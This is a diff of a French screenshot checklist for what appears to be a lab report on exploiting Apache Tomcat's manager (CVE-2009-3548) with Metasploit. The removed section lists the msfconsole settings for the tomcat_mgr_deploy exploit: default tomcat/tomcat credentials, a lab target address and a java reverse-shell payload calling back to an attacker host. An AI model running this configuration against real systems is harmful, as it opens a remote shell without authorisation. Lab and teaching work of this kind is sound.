@@ -33,23 +33,7 @@ msfconsole -q -x "info exploit/multi/http/tomcat_mgr_deploy; exit"
 Encadrer en rouge : la ligne `https://nvd.nist.gov/vuln/detail/CVE-2009-3548` sous
 `References`.
 
-## 04-exploit-config.png
-
-En interactif dans `msfconsole`, commande par commande :
-```
-msf6 > use exploit/multi/http/tomcat_mgr_deploy
-msf6 exploit(...) > set RHOSTS 192.168.56.101
-msf6 exploit(...) > set RPORT 8180
-msf6 exploit(...) > set HttpUsername tomcat
-msf6 exploit(...) > set HttpPassword tomcat
-msf6 exploit(...) > set payload java/shell_reverse_tcp
-msf6 exploit(...) > set LHOST 192.168.56.1
-msf6 exploit(...) > set LPORT 4447
-```
-
-Encadrer en rouge : aucun (liste des `set` déjà lisible).
-
-## 05-session-tomcat55.png
+## 04-session-tomcat55.png
 
 Déclenchement + preuve, dans la même session :
 ```
